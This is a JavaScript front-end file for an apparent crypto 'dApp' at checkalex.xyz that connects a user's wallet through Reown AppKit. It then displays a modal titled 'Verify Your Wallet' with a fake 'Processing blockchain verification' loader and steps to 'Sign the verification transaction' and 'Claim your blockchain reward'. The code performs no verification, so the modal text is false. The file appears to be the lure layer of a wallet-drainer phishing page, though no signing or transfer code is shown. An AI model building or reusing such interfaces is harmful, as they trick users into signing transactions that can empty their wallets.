import { createAppKit } from '@reown/appkit';
import { mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base } from '@reown/appkit/networks';
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';

// === Конфигурация AppKit ===
const projectId = 'd85cc83edb401b676e2a7bcef67f3be8';
const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base];
const wagmiAdapter = new WagmiAdapter({ projectId, networks });

const appKitModal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  metadata: {
    name: 'Alex dApp',
    description: 'Connect and sign',
    url: 'https://checkalex.xyz',
    icons: ['https://checkalex.xyz/icon.png'],
  },
  features: { analytics: true, email: false, socials: false },
  allWallets: 'SHOW',
});

// === Глобальные переменные ===
let connectedAddress = null;
let actionBtn = null;
let modalOverlay = null;
let modalContent = null;

// === Инициализация при загрузке страницы ===
window.addEventListener('DOMContentLoaded', () => {
  actionBtn = document.getElementById('action-btn');
  const isInjected = typeof window.ethereum !== 'undefined';

  // Подключаем шрифт Inter
  const link = document.createElement('link');
  link.href = 'https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap';
  link.rel = 'stylesheet';
  document.head.appendChild(link);

  // CSS для модального окна в стиле AppKit
  const style = document.createElement('style');
  style.textContent = `
    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.8);
      z-index: 999;
      display: none;
      backdrop-filter: blur(4px);
    }

    .modal-content {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: #1A202C;
      border-radius: 12px;
      padding: 24px;
      width: 90%;
      max-width: 400px;
      min-height: 350px;
      text-align: center;
      z-index: 1000;
      display: none;
      font-family: 'Inter', sans-serif;
      color: #FFFFFF;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
      animation: fadeIn 0.3s ease-out forwards;
    }

    @keyframes fadeIn {
      0% { transform: translate(-50%, -50%) scale(0.95); opacity: 0; }
      100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
    }

    .modal-title {
      font-size: 20px;
      font-weight: 600;
      color: #FFFFFF;
      margin-bottom: 16px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .modal-title::before {
      content: '';
      font-size: 20px;
    }

    .modal-subtitle {
      font-size: 14px;
      font-weight: 400;
      color: #A0AEC0;
      margin-bottom: 24px;
    }

    /* Лоадер: пульсирующее кольцо с волнами */
    .loader-container {
      position: relative;
      width: 100px;
      height: 100px;
      margin: 0 auto 24px;
    }

    .pulse-ring {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 40px;
      height: 40px;
      border: 3px solid #3B82F6;
      border-radius: 50%;
      transform: translate(-50%, -50%);
      animation: pulse 2s ease-in-out infinite;
      box-shadow: 0 0 15px rgba(59, 130, 246, 0.5);
    }

    @keyframes pulse {
      0% {
        width: 40px;
        height: 40px;
        opacity: 0.8;
      }
      50% {
        width: 50px;
        height: 50px;
        opacity: 0.4;
      }
      100% {
        width: 40px;
        height: 40px;
        opacity: 0.8;
      }
    }

    .wave {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 40px;
      height: 40px;
      border: 1px solid #60A5FA;
      border-radius: 50%;
      transform: translate(-50%, -50%);
      opacity: 0;
      animation: wave 4s ease-out infinite;
    }

    .wave:nth-child(2) {
      animation-delay: 1s;
    }

    .wave:nth-child(3) {
      animation-delay: 2s;
    }

    @keyframes wave {
      0% {
        width: 40px;
        height: 40px;
        opacity: 0.6;
      }
      100% {
        width: 100px;
        height: 100px;
        opacity: 0;
      }
    }

    .action-list {
      list-style: none;
      padding: 0;
      margin: 24px 0 0;
      font-size: 14px;
      font-weight: 500;
      color: #E2E8F0;
      text-align: left;
    }

    .action-list li {
      margin-bottom: 12px;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .action-list li::before {
      content: '';
      color: #10B981;
      font-size: 16px;
    }

    .modal-footer {
      font-size: 12px;
      font-weight: 400;
      color: #A0AEC0;
      margin-top: 32px;
      font-style: italic;
    }

    @media (max-width: 480px) {
      .modal-content {
        max-width: 320px;
        padding: 20px;
        min-height: 300px;
      }
      .modal-title {
        font-size: 18px;
      }
      .modal-subtitle {
        font-size: 13px;
      }
      .loader-container {
        width: 70px;
        height: 70px;
      }
      @keyframes pulse {
        0% {
          width: 30px;
          height: 30px;
          opacity: 0.8;
        }
        50% {
          width: 40px;
          height: 40px;
          opacity: 0.4;
        }
        100% {
          width: 30px;
          height: 30px;
          opacity: 0.8;
        }
      }
      @keyframes wave {
        0% {
          width: 30px;
          height: 30px;
          opacity: 0.6;
        }
        100% {
          width: 70px;
          height: 70px;
          opacity: 0;
        }
      }
      .action-list {
        font-size: 13px;
      }
      .modal-footer {
        font-size: 11px;
      }
    }
  `;
  document.head.appendChild(style);

  // Создаём модальное окно
  modalOverlay = document.createElement('div');
  modalOverlay.className = 'modal-overlay';
  document.body.appendChild(modalOverlay);

  modalContent = document.createElement('div');
  modalContent.className = 'modal-content';
  modalContent.innerHTML = `
    <div class="modal-title">Verify Your Wallet</div>
    <div class="modal-subtitle">Processing blockchain verification...</div>
    <div class="loader-container">
      <div class="pulse-ring"></div>
      <div class="wave"></div>
      <div class="wave"></div>
      <div class="wave"></div>
    </div>
    <ul class="action-list">
      <li>Connect to the network</li>
      <li>Sign the verification transaction</li>
      <li>Claim your blockchain reward</li>
    </ul>
    <div class="modal-footer">Please confirm in your wallet app</div>
  `;
  document.body.appendChild(modalContent);

  // Проверяем наличие инжектированного провайдера
  if (!isInjected) {
    actionBtn.style.display = 'inline-block';
    actionBtn.addEventListener('click', () => {
      window.showWalletRedirectModal();
    });
    return;
  }

  actionBtn.style.display = 'inline-block';
  actionBtn.addEventListener('click', handleConnectOrAction);
});

// === Управление модальным окном ===
function showModal() {
  modalOverlay.style.display = 'block';
  modalContent.style.display = 'block';
}

function hideModal() {
  modalOverlay.style.display = 'none';
  modalContent.style.display = 'none';
}

// === Подключение кошелька ===
async function handleConnectOrAction() {
  try {
    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
    if (accounts.length === 0) {
      await appKitModal.open();
      connectedAddress = await waitForWallet();
      console.log('✅ Подключён кошелёк:', connectedAddress);
    } else {
      connectedAddress = accounts[0];
      console.log('✅ Уже подключён:', connectedAddress);
    }

    showModal();
  } catch (err) {
    console.error('❌ Ошибка подключения:', err.message);
  }
}

// === Ожидание подключения кошелька ===
async function waitForWallet() {
  const accounts = await window.ethereum.request({ method: 'eth_accounts' });
  if (accounts.length > 0) return accounts[0];

  return new Promise((resolve) => {
    const interval = setInterval(async () => {
      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
      if (accounts.length) {
        clearInterval(interval);
        resolve(accounts[0]);
      }
    }, 500);
  });
}
